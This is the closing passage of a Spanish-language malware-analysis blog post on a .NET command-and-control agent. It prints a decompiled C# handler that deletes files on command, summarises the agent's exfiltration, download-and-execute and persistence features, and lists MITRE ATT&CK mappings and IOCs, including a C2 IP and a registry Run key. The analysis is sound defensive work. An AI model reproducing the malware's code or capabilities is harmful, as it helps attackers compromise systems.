<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (text == <span style="color:#e6db74">&#34;deyTlt&#34;</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">this</span>.trasQfiles(procss_type[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> trasQfiles(<span style="color:#66d9ef">string</span> path) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    File.Delete(path);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="3-conclusiones">
  3. Conclusiones
  <a href="#3-conclusiones" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Cuando comencé a escribir este artículo creí que sería la parte final del análisis; sin embargo, luego de identificar la cantidad de funciones que el agente exponía, preferí entrar a detalle en algunas y dejar el análisis dinámico para el siguiente artículo.</p>
<p>El malware analizado tiene todas las características de un agente de Comando y Control: se contacta con el servidor cada cierto tiempo, permite obtener información del sistema, permite exfiltrar información, permite descargar binarios al sistema y ejecutarlos, entre otras funciones.</p>
<p>El malware utiliza un par de técnicas para evalidar herramientas de análisis de código estático: uso de subguiones para alterar nombres de variables/llaves de registro, así como el uso de un arreglo de bytes para almacenar una IP en vez de almacenarla en plano; aún así, el que haya sido desarrollado en .NET permite su fácil decompilación y análisis.</p>
<p><a href="/es/posts/005-analyzing-a-dotnet-c2-agent-part3-dynamic-analysis/">En el próximo artículo</a> detallaré como alguien puede interactuar con el malware como parte de su análisis, y así evidenciar si tiene alǵun comportamiento no identificado como parte del análisis estático.</p>
<h2 id="4-mapeo-mitre-attck">
  4. Mapeo MITRE ATT&amp;CK
  <a href="#4-mapeo-mitre-attck" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>ID</th>
<th>Táctica</th>
<th>Técnica</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>T1059.003</td>
<td>Ejecución</td>
<td>Command and Scripting Interpreter: Windows Command Shell</td>
<td>Se utilizó el método Process.Start para iniciar nuevos procesos</td>
</tr>
<tr>
<td>T1547.001</td>
<td>Persistencia</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
<td>Se utilizó una llave de registro para establecer persistencia</td>
</tr>
<tr>
<td>T1070.004</td>
<td>Evasión de defensas</td>
<td>Indicator Removal: File Deletion</td>
<td>El agente tiene la capacidad de eliminar archivos</td>
</tr>
<tr>
<td>T1057</td>
<td>Descubrimiento</td>
<td>Process Discovery</td>
<td>El agente tiene la capacidad de listar procesos</td>
</tr>
<tr>
<td>T1082</td>
<td>Descubrimiento</td>
<td>System Information Discovery</td>
<td>El agente tiene la capacidad de obtener información del sistema</td>
</tr>
<tr>
<td>T1027.010</td>
<td>Evasión de defensas</td>
<td>Obfuscated Files or Information: Command Obfuscation</td>
<td>Se utilizó el reemplazo de caracteres para ofuscar comandos</td>
</tr>
<tr>
<td>T1113</td>
<td>Colección</td>
<td>Screen Capture</td>
<td>El agente tiene la capacidad de sacar capturas de pantalla</td>
</tr>
<tr>
<td>T1005</td>
<td>Colección</td>
<td>Data from Local System</td>
<td>El agente tiene la capacidad de obtener información de archivos del sistema</td>
</tr>
<tr>
<td>T1571</td>
<td>Comando y Control</td>
<td>Non-Standard Port</td>
<td>El agente no utiliza puertos comunes para comunicarse con el servidor de C2</td>
</tr>
<tr>
<td>T1095</td>
<td>Comando y Control</td>
<td>Non-Application Layer Protocol</td>
<td>El agente se comunica mediante TCP, interactuando directo con el flujo de datos</td>
</tr>
<tr>
<td>T1041</td>
<td>Comando y Control</td>
<td>Exfiltration Over C2 Channel</td>
<td>El agente exfiltra información utilizando la conexión establecida con el servidor de C2</td>
</tr>
</tbody>
</table>
<h2 id="5-ioc">
  5. IOC
  <a href="#5-ioc" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>IOC</th>
<th>Tipo</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>59211a4e0f27d70 c659636746b61945a</td>
<td>Hash MD5</td>
<td>Hash del agente de C2</td>
</tr>
<tr>
<td>162.245.191.217</td>
<td>IP</td>
<td>IP a donde se comunica el agente</td>
</tr>
<tr>
<td>HKEY_CURRENT_USER\ Software\Microsoft \Windows\CurrentVersion\ Run\haijwivetsgVr</td>
<td>Llave de registro</td>
<td>Llave que el agente utiliza para establecer persistencia</td>
</tr>
</tbody>
</table>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Leer otras publicaciones</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/es/posts/005-analyzing-a-dotnet-c2-agent-part3-dynamic-analysis/">
                  <span class="button__icon">←</span>
                  <span class="button__text">005 - Analizando un agente de C2 - Parte 3: el agente - Análisis dinámico</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">
                  <span class="button__text">003 - Analizando un agente de C2 - Parte 1: el Dropper</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Threat Anatomy Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2024 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
    
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
